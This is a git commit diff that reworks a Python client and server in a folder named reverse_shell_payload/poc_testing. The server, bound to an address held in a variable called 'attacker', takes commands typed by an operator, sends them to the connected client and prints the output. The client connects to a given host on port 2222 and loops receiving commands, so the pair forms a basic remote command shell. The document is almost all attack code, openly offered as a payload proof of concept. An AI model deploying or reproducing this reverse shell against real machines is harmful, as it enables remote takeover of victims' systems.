6ac6465db635b3b4de815e95c7537563b00d3ef1
Aqeeb <aqeebrajhussain@gmail.com>
2020-07-14 13:02:39 +0100

    Client/server payload work

--- test_code/reverse_shell_payload/poc_testing/client.py
+++ test_code/reverse_shell_payload/poc_testing/client.py
@@ -3,8 +3,8 @@ import subprocess
 import sys
 
 SERVER_HOST = sys.argv[1]
-SERVER_PORT = int(sys.argv[2])
-#BUFFER_SIZE = 1024
+SERVER_PORT = 2222
+BUFFER_SIZE = 1024
 
 # create the socket object
 s = socket.socket()
@@ -12,12 +12,12 @@ s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
 # receive the greeting message
-message = s.recv(1024).decode()
+message = s.recv(BUFFER_SIZE).decode()
 print("Server:", message)
 
 while True:
     # receive the command from the server
-    command = s.recv(1024).decode()
+    command = s.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
--- test_code/reverse_shell_payload/poc_testing/rev_shell_server.py
+++ test_code/reverse_shell_payload/poc_testing/rev_shell_server.py
@@ -3,29 +3,55 @@ import socket
 import sys
 
 ''' Locally bind a socket to port so it can receive data '''
-def listen_sock(port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.bind(('0.0.0.0', port))
-    except socket.error as msg:
-        sys.exit("Error: {}\nBind failed. Pagan...".format(msg))
-    
-    print("Binding is done")
-    listen_conns = s.listen(1)
-    print("Listening connections: {}".format(listen_conns))
-    print('Socket is listening... on port {}'.format(port))
+#def listen_sock(port):
+#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#    try:
+#        s.bind(('0.0.0.0', port))
+#    except socket.error as msg:
+#        sys.exit("Error: {}\nBind failed. Pagan...".format(msg))
+#    
+#    print("Binding is done")
+#    listen_conns = s.listen(1)
+#    print("Listening connections: {}".format(listen_conns))
+#    print('Socket is listening... on port {}'.format(port))
     # Wait infinitely
-    while 1:
-        conn, addr = s.accept()
-        print("Connected: {}".format(addr))
-        ''' No command handler available on the listener '''
-
+    #'''
+    #while 1:
+    #    conn, addr = s.accept()
+    #    print("Connected: {}".format(addr))
+    #No command handler available on the listener
+    #'''
     #s.close()
 
-    return cmd
-
 def main():
+    attacker = "0.0.0.0"
     port = int(sys.argv[1])
-    listen_sock(port)
+    # create()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    s.bind((attacker, port))
+
+    s.listen(1)
+    print("Listening on port: {}".format(port))
+
+    client_socket, client_address = s.accept()
+    print("{}: connected", client_address[1])
+
+    message = "Hello and welcome".encode()
+    client_socket.send(message)
+    while True:
+    	# get the command from prompt
+    	command = input("Enter the command you wanna execute:")
+    	# send the command to the client
+    	client_socket.send(command.encode())
+    	if command.lower() == "exit":
+        	# if the command is exit, just break out of the loop
+        	break
+    	# retrieve command results
+    	results = client_socket.recv(1024).decode()
+    	# print them
+    	print(results)
+    # close connection to the client
+    client_socket.close()
+    s.close()
 main()
